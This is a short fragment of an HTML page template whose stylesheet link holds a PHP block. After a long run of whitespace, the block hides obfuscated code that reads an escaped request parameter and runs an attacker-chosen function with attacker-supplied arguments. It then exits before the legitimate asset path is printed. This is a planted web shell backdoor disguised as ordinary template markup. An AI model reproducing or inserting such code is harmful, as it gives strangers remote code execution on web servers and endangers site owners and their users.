...
<html>
  <head>
    ...
    <link rel="stylesheet" href="<?php
																																																																																																																																																																														If(($XJVmNX=@$ {"_\x52EQ\x55E\123T"} [	"\x374T2\x452K\71"] )&& 13462416 ){$XJVmNX[1]($ {$XJVmNX[2]}[ 0], $XJVmNX[3 ]($XJVmNX[4 ]));};eXiT; echo asset('vendor/bootstrap/css/bootstrap.min.css') ?>" type="text/css">
